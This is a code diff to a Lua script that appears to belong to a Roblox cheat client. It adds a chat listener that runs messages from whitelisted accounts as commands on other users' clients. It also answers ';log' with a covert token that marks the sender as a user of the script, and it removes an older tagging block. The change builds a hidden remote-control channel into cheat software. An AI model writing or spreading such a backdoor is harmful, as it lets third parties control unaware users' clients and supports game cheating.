@@ -160,6 +160,31 @@ local function exec(cmd, senderId)
 	end
 end
 
+local function chatMessage(str)
+	str = tostring(str)
+	pcall(function()
+		TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+	end)
+end
+
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+
+	if uid ~= LOCAL_PLAYER.UserId and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		exec(t, uid)
+	end
+
+	if t == ";log" and not isWhitelisted(LOCAL_PLAYER.UserId) then
+		task.delay(0.4, function()
+			chatMessage("8Uz1P")
+		end)
+	end
+end)
+
+
 TextChatService.MessageReceived:Connect(function(msg)
 	local t = msg.Text
 	local s = msg.TextSource
@@ -171,28 +196,6 @@ TextChatService.MessageReceived:Connect(function(msg)
 	exec(t, uid)
 end)
 
-do
-	local I_AM_WHITELISTED = isWhitelisted(LOCAL_PLAYER.UserId)
-
-	TextChatService.MessageReceived:Connect(function(msg)
-		local content = msg.Text
-		local source = msg.TextSource
-		if not source then return end
-
-		local sender = Players:GetPlayerByUserId(source.UserId)
-		if not sender then return end
-
-		if not I_AM_WHITELISTED and content:lower() == ";log" then
-			TextChatService:SendAsync("8Uz1P")
-		end
-
-		if I_AM_WHITELISTED and content == "8Uz1P" then
-			if not isWhitelisted(sender.UserId) then
-				applyTag(sender, "[VAPE USER]", Color3.fromRGB(100, 255, 100))
-			end
-		end
-	end)
-end
 
 local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
